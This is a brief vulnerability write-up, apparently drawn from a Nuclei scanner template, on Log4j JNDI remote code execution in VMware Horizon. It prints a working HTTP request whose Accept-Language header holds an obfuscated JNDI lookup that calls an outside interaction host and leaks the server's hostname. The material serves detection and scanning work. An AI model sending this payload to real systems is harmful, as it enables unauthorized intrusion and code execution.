# Vulnerability: VMware Horizon - JNDI Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`vmware-horizon-log4j-rce.yaml`)

## Description
VMware Horizon is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /portal/info.jsp HTTP/1.1
Host: {{Hostname}}
Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
```

